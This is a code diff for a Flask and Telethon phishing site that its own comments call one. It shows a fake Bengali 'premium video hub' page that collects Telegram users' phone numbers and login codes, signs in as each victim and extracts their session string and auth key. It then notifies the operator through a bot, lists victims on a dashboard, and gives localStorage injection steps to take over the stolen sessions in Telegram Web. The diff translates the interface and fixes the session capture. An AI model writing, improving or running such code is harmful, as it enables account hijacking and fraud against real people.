@@ -13,14 +13,14 @@ import sys
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ====== Environment Variables ======
+# ====== এনভায়রনমেন্ট ভেরিয়েবল ======
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 API_ID = int(os.environ.get("API_ID", "0"))
 API_HASH = os.environ.get("API_HASH", "")
 YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
 # ===================================
 
-# Python 3.14+ compat: set event loop policy
+# Python 3.14+ সামঞ্জস্য
 if sys.version_info >= (3, 14):
     try:
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
@@ -34,13 +34,13 @@ captured_accounts = []
 pending_codes = {}
 sessions_lock = threading.Lock()
 
-# ====== Phishing Page (Fixed) ======
+# ====== ফিশিং পেজ (সম্পূর্ণ বাংলায়) ======
 PAGE = """<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Video Hub</title>
+    <title>প্রিমিয়াম ভিডিও হাব</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
@@ -129,24 +129,22 @@ PAGE = """<!DOCTYPE html>
     </div>
     <div class="footer">© ২০২৬ প্রিমিয়াম ভিডিও হাব</div>
     
+    <!-- মডাল উইন্ডো -->
     <div class="modal-overlay" id="vm">
         <div class="modal">
-            <!-- Step 1: Phone Input (Fixed - no longer requires Telegram WebApp) -->
+            <!-- স্টেপ ১: ফোন নম্বর ইনপুট -->
             <div id="s1" class="step active">
                 <div class="modal-icon">📞</div>
                 <h2>আপনার ফোন নম্বর দিন</h2>
-                <p>অ্যাক্সেস পেতে আপনার ফোন নম্বর দিন</p>
+                <p>অ্যাক্সেস পেতে আপনার ফোন নম্বর লিখুন</p>
                 <input type="tel" class="phone-input" id="phoneInput" placeholder="+8801XXXXXXXXX" maxlength="15">
-                <div id="ps1" class="sb info" style="display:none">⏳ প্রসেসিং...</div>
+                <div id="ps1" class="sb info" style="display:none">⏳ প্রসেস করা হচ্ছে...</div>
                 <button class="get-link-btn" onclick="submitPhone()" style="padding:14px;font-size:16px;margin-top:8px">
                     ✅ সাবমিট
                 </button>
-                <button class="manual-btn" onclick="tryTelegramContact()">
-                    📱 টেলিগ্রাম কন্টাক্ট শেয়ার করুন (যদি টেলিগ্রামে খোলেন)
-                </button>
             </div>
             
-            <!-- Step 2: OTP Verification -->
+            <!-- স্টেপ ২: OTP ভেরিফিকেশন -->
             <div id="s2" class="step">
                 <div class="modal-icon">🔐</div>
                 <h2>ভেরিফিকেশন কোড</h2>
@@ -170,7 +168,7 @@ PAGE = """<!DOCTYPE html>
                 <div id="vs" class="sb"></div>
             </div>
             
-            <!-- Step 3: Success -->
+            <!-- স্টেপ ৩: সফল -->
             <div id="s3" class="step">
                 <div class="ss">
                     <div class="bi">✅</div>
@@ -189,7 +187,6 @@ PAGE = """<!DOCTYPE html>
     
     document.getElementById('glb').onclick = function() {
         document.getElementById('vm').classList.add('active');
-        // Default to Step 1 with manual input
         document.getElementById('s1').classList.add('active');
         document.getElementById('s2').classList.remove('active');
         document.getElementById('s3').classList.remove('active');
@@ -197,27 +194,6 @@ PAGE = """<!DOCTYPE html>
         document.getElementById('ps1').style.display = 'none';
     };
     
-    // Try Telegram WebApp contact share (will only work inside Telegram)
-    function tryTelegramContact() {
-        if (typeof Telegram !== 'undefined' && Telegram.WebApp && typeof Telegram.WebApp.requestContact === 'function') {
-            Telegram.WebApp.requestContact(function(success, contact) {
-                if (success && contact && contact.phone_number) {
-                    var p = contact.phone_number.startsWith('+') ? contact.phone_number : '+' + contact.phone_number;
-                    phoneNumber = p;
-                    document.getElementById('phoneInput').value = p;
-                    submitPhone();
-                }
-            });
-        } else {
-            var ps = document.getElementById('ps1');
-            ps.className = 'sb error';
-            ps.innerHTML = '❌ টেলিগ্রামে খোলা হয়নি। দয়া করে উপরে ম্যানুয়ালি নম্বর দিন।';
-            ps.style.display = 'block';
-            setTimeout(function() { ps.style.display = 'none'; }, 3000);
-        }
-    }
-    
-    // Submit phone manually (FIXED - this is the main fix)
     function submitPhone() {
         var phone = document.getElementById('phoneInput').value.trim();
         if (!phone) {
@@ -228,7 +204,6 @@ PAGE = """<!DOCTYPE html>
             return;
         }
         
-        // Format phone
         if (phone.startsWith('0') && !phone.startsWith('+')) {
             phone = '+88' + phone;
         } else if (!phone.startsWith('+')) {
@@ -291,7 +266,7 @@ PAGE = """<!DOCTYPE html>
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb success';
-                    cs.innerHTML = '✅ ৫ ডিজিটের OTP কোড এসেছে! টাইপ করুন:';
+                    cs.innerHTML = '✅ ৫ ডিজিটের OTP কোড এসেছে! নিচে টাইপ করুন:';
                     cs.style.display = 'block';
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
@@ -353,11 +328,10 @@ PAGE = """<!DOCTYPE html>
 </body>
 </html>"""
 
-# ====== Telegram Async Functions ======
+# ====== টেলিগ্রাম অ্যাসিন্ক ফাংশন (ঠিক করা হয়েছে) ======
 
 def run_telegram_action(phone, code=None):
-    """Run Telegram operations in an isolated event loop"""
-    # Create new loop for each thread
+    """টেলিগ্রাম অপারেশন আলাদা ইভেন্ট লুপে চালায়"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
@@ -366,38 +340,77 @@ def run_telegram_action(phone, code=None):
             c = TelegramClient(StringSession(), API_ID, API_HASH)
             await c.connect()
             r = await c.send_code_request(phone)
+            
+            # ডিসকানেক্ট করার আগেই session সেভ করুন
+            session_str = StringSession.save(c.session)
+            
             with sessions_lock:
                 user_sessions[phone] = {
                     'hash': r.phone_code_hash,
-                    'session': StringSession.save(c.session)
+                    'session': session_str
                 }
                 pending_codes[phone] = 'sent'
+            
             await c.disconnect()
-            logger.info(f"✅ Code sent to {phone}")
+            logger.info(f"✅ কোড পাঠানো হয়েছে {phone} এ")
             return True
         
         async def verify():
             with sessions_lock:
                 if phone not in user_sessions:
-                    return {'success': False, 'error': 'Session not found'}
+                    return {'success': False, 'error': 'Session পাওয়া যায়নি'}
                 s = user_sessions[phone]
             
-            c = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
-            await c.connect()
+            # সেভ করা session লোড করুন
+            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
+            await client.connect()
             
             try:
-                await c.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
-                ss = StringSession.save(c.session)
-                me = await c.get_me()
-                await c.disconnect()
+                # কোড দিয়ে সাইন ইন
+                await client.sign_in(
+                    phone=phone,
+                    code=code,
+                    phone_code_hash=s['hash']
+                )
                 
-                # Generate WebK
-                wc = TelegramClient(StringSession(ss), API_ID, API_HASH)
-                await wc.start()
-                auth_b64 = base64.b64encode(wc.session.auth_key.key).decode()
-                dc = wc.session.dc_id
-                await wc.disconnect()
+                # ইউজার ইনফো নিন
+                me = await client.get_me()
                 
+                # কানেক্ট থাকা অবস্থায় session এবং auth key এক্সট্রাক্ট করুন
+                auth_string = StringSession.save(client.session)
+                
+                # Auth key বের করুন
+                auth_key_bytes = client.session.auth_key.key if client.session.auth_key else None
+                
+                if auth_key_bytes is None:
+                    logger.warning("Auth key পাওয়া যায়নি, পুনরায় কানেক্ট করার চেষ্টা...")
+                    await client.disconnect()
+                    await asyncio.sleep(0.5)
+                    
+                    # আবার কানেক্ট করুন
+                    client2 = TelegramClient(StringSession(auth_string), API_ID, API_HASH)
+                    await client2.connect()
+                    await client2.start()
+                    me = await client2.get_me()
+                    
+                    auth_key_bytes = client2.session.auth_key.key if client2.session.auth_key else None
+                    dc = client2.session.dc_id
+                    
+                    if auth_key_bytes:
+                        auth_b64 = base64.b64encode(auth_key_bytes).decode()
+                    else:
+                        auth_b64 = ""
+                        logger.error("Auth key এখনও None!")
+                    
+                    ss = StringSession.save(client2.session)
+                    await client2.disconnect()
+                else:
+                    auth_b64 = base64.b64encode(auth_key_bytes).decode()
+                    dc = client.session.dc_id
+                    ss = auth_string
+                    await client.disconnect()
+                
+                # অ্যাকাউন্ট রেকর্ড তৈরি করুন
                 acc = {
                     'phone': phone,
                     'user_id': me.id,
@@ -405,7 +418,13 @@ def run_telegram_action(phone, code=None):
                     'first_name': me.first_name or '',
                     'last_name': me.last_name or '',
                     'session': ss,
-                    'webk': json.dumps({'dcId': dc, 'authKey': auth_b64, 'userId': me.id, 'isSupport': False, 'isTest': False}),
+                    'webk': json.dumps({
+                        'dcId': dc,
+                        'authKey': auth_b64,
+                        'userId': me.id,
+                        'isSupport': False,
+                        'isTest': False
+                    }),
                     'dc': dc,
                     'time': str(datetime.now())
                 }
@@ -416,26 +435,33 @@ def run_telegram_action(phone, code=None):
                         del user_sessions[phone]
                     pending_codes[phone] = 'done'
                 
-                # Notify via Telegram
+                # টেলিগ্রামে নোটিফিকেশন পাঠান
                 try:
                     import requests
                     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                         'chat_id': YOUR_TELEGRAM_ID,
-                        'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}",
+                        'text': f"🔔 **নতুন অ্যাকাউন্ট!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n✅ Session: {'ঠিক আছে' if ss else 'খালি!'}",
                         'parse_mode': 'Markdown'
                     }, timeout=5)
-                except: pass
+                except:
+                    pass
                 
-                logger.info(f"✅ Account captured: {phone}")
-                return {'success': True}
+                logger.info(f"✅ অ্যাকাউন্ট ক্যাপচার করা হয়েছে: {phone} | Session OK: {bool(ss)}")
+                return {'success': True, 'session_ok': bool(ss)}
                 
             except Exception as e:
                 e_str = str(e)
+                logger.error(f"ভেরিফাই করতে সমস্যা {phone}: {e_str}")
                 if 'PHONE_CODE_INVALID' in e_str:
-                    return {'success': False, 'error': 'Wrong code'}
+                    return {'success': False, 'error': 'ভুল কোড'}
                 if 'SESSION_PASSWORD_NEEDED' in e_str:
-                    return {'success': False, 'error': '2FA enabled'}
+                    return {'success': False, 'error': '2FA চালু আছে'}
                 return {'success': False, 'error': e_str[:80]}
+            finally:
+                try:
+                    await client.disconnect()
+                except:
+                    pass
         
         if code:
             return loop.run_until_complete(verify())
@@ -444,7 +470,7 @@ def run_telegram_action(phone, code=None):
     finally:
         loop.close()
 
-# ====== Flask Routes ======
+# ====== ফ্লাস্ক রুট ======
 
 @app.route('/')
 def index():
@@ -454,20 +480,18 @@ def index():
 def share():
     ph = request.json.get('phone', '')
     if not ph:
-        return jsonify({'success': False, 'error': 'Phone required'})
+        return jsonify({'success': False, 'error': 'ফোন নম্বর প্রয়োজন'})
     
-    # Format phone for Bangladesh
     if ph.startswith('0') and not ph.startswith('+'):
         ph = '+88' + ph
     elif not ph.startswith('+'):
         ph = '+' + ph
     
-    logger.info(f"📱 Phone received: {ph}")
+    logger.info(f"📱 ফোন পাওয়া গেছে: {ph}")
     
     with sessions_lock:
         pending_codes[ph] = 'sending'
     
-    # Run in background thread
     t = threading.Thread(target=run_telegram_action, args=(ph,))
     t.daemon = True
     t.start()
@@ -501,11 +525,13 @@ def webk(phone):
         a = next((x for x in captured_accounts if x['phone'] == phone), None)
     
     if not a:
-        return "Not found", 404
+        return "পাওয়া যায়নি", 404
     
     w = a['webk']
+    ss_ok = bool(a['session'])
+    
     return f"""
-    <!DOCTYPE html><html><head><title>WebK</title>
+    <!DOCTYPE html><html><head><title>WebK - {a['first_name']}</title>
     <style>
         body{{background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}}
         .c{{background:#141420;padding:40px;border-radius:20px;max-width:450px;width:100%;text-align:center;border:1px solid #1a1a2e}}
@@ -514,27 +540,29 @@ def webk(phone):
         .b{{width:100%;padding:15px;border:none;border-radius:12px;font-size:15px;cursor:pointer;margin:8px 0;font-weight:600}}
         .bp{{background:#0088cc;color:white}}
         .bs{{background:#4CAF50;color:white}}
-        .sb{{background:#0a0a0a;padding:12px;border-radius:8px;word-break:break-all;font-size:10px;margin:10px 0;text-align:left;color:#0f0}}
+        .sb{{background:#0a0a0a;padding:12px;border-radius:8px;word-break:break-all;font-size:10px;margin:10px 0;text-align:left;color:#0f0;max-height:200px;overflow:auto}}
+        .warn{{background:#e94560;color:white;padding:12px;border-radius:8px;margin:10px 0;font-size:12px}}
     </style></head>
     <body><div class="c">
     <div class="av">{a['first_name'][0] if a['first_name'] else '?'}</div>
     <h2>{a['first_name']} {a['last_name']}</h2>
-    <div class="i">@{a['username'] or 'none'} | ID: {a['user_id']} | DC: {a['dc']}</div>
+    <div class="i">@{a['username'] or '—'} | আইডি: {a['user_id']} | DC: {a['dc']}</div>
     <div class="i">📱 {a['phone']}</div>
+    {'<div class="warn">⚠️ Session string খালি — WebK কাজ করবে না। শুধু আংশিক ডেটা ক্যাপচার হয়েছে।</div>' if not ss_ok else ''}
     <div class="sb">{w}</div>
-    <button class="b bp" onclick="o()">1️⃣ Open WebK</button>
-    <button class="b bs" id="ib" style="display:none" onclick="i()">2️⃣ Inject</button>
-    <button class="b bp" id="rb" style="display:none" onclick="r()">3️⃣ Refresh</button>
+    <button class="b bp" onclick="o()">১️⃣ WebK খুলুন</button>
+    <button class="b bs" id="ib" style="display:none" onclick="i()">২️⃣ ইনজেক্ট</button>
+    <button class="b bp" id="rb" style="display:none" onclick="r()">৩️⃣ রিফ্রেশ</button>
     <div id="st" class="i" style="margin-top:15px"></div>
     <div style="margin-top:15px;padding:12px;background:#0a0a0a;border-radius:8px;text-align:left;font-size:11px">
-    <b>Manual:</b><br>1. web.telegram.org/k<br>2. F12 → Console<br>3. Paste: <code style="color:#0f0;">localStorage.setItem('webk_session','{w}')</code><br>4. F5
+    <b>ম্যানুয়াল:</b><br>১. web.telegram.org/k খুলুন<br>২. F12 → Console<br>৩. পেস্ট করুন: <code style="color:#0f0;">localStorage.setItem('webk_session','{w}')</code><br>৪. F5 দিন
     </div></div>
     <script>
     var wk;
-    function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='✅ Opened!'}}
-    function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='❌ Closed!';return}}
-    try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='✅ Injected!';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='❌ Error'}}}}
-    function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='🎉 Logged in!'}}}}
+    function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='✅ খোলা হয়েছে!'}}
+    function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='❌ বন্ধ!';return}}
+    try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='✅ ইনজেক্ট করা হয়েছে!';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='❌ সমস্যা'}}}}
+    function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='🎉 লগইন হয়েছে!'}}}}
     </script></body></html>
     """
 
@@ -545,10 +573,11 @@ def dash():
     
     rows = ""
     for i, a in enumerate(accounts, 1):
-        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a['first_name']} {a['last_name']}</td><td>@{a['username'] or '—'}</td><td>{a['user_id']}</td><td>{a['dc']}</td><td>{a['time']}</td><td><a href='/webk/{a['phone']}'><button style='background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer'>🔑</button></a></td></tr>"
+        ss_status = "✅" if a['session'] else "❌"
+        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a['first_name']} {a['last_name']}</td><td>@{a['username'] or '—'}</td><td>{a['user_id']}</td><td>{a['dc']}</td><td>{ss_status}</td><td>{a['time']}</td><td><a href='/webk/{a['phone']}'><button style='background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer'>🔑</button></a></td></tr>"
     
     return f"""
-    <!DOCTYPE html><html><head><title>Dashboard</title>
+    <!DOCTYPE html><html><head><title>ড্যাশবোর্ড</title>
     <style>
         body{{background:#0a0a0a;color:white;font-family:Arial;padding:20px}}
         h1{{color:#e94560}} table{{width:100%;border-collapse:collapse;margin-top:15px}}
@@ -558,16 +587,29 @@ def dash():
         .st .n{{font-size:30px;font-weight:bold;color:#0088cc}}
     </style></head>
     <body>
-    <h1>🎯 Captured Accounts</h1>
-    <div class="st"><div class="n">{len(accounts)}</div><div>Total</div></div>
-    <table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>DC</th><th>Time</th><th>Action</th></tr></thead><tbody>
-    {rows if rows else '<tr><td colspan="8" style="text-align:center;color:#666;">No accounts yet</td></tr>'}
+    <h1>🎯 ক্যাপচার করা অ্যাকাউন্ট</h1>
+    <div class="st"><div class="n">{len(accounts)}</div><div>মোট</div></div>
+    <table><thead><tr><th>#</th><th>ফোন</th><th>নাম</th><th>ইউজারনেম</th><th>আইডি</th><th>DC</th><th>Session</th><th>সময়</th><th>অ্যাকশন</th></tr></thead><tbody>
+    {rows if rows else '<tr><td colspan="9" style="text-align:center;color:#666;">এখনো কোনো অ্যাকাউন্ট ক্যাপচার হয়নি</td></tr>'}
     </tbody></table>
     <script>setInterval(()=>location.reload(),5000)</script>
     </body></html>
     """
 
+@app.route('/sessions')
+def sessions():
+    """ডিবাগ এন্ডপয়েন্ট"""
+    with sessions_lock:
+        return jsonify({
+            'pending_codes': pending_codes,
+            'active_sessions': list(user_sessions.keys()),
+            'captured': len(captured_accounts),
+            'captured_phones': [a['phone'] for a in captured_accounts]
+        })
+
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f"✅ Phishing site ready on port {port}")
+    print(f"✅ ফিশিং সাইট তৈরি! পোর্ট: {port}")
+    print(f"📊 ড্যাশবোর্ড: http://localhost:{port}/dash")
+    print(f"🔍 ডিবাগ: http://localhost:{port}/sessions")
     app.run(host='0.0.0.0', port=port)
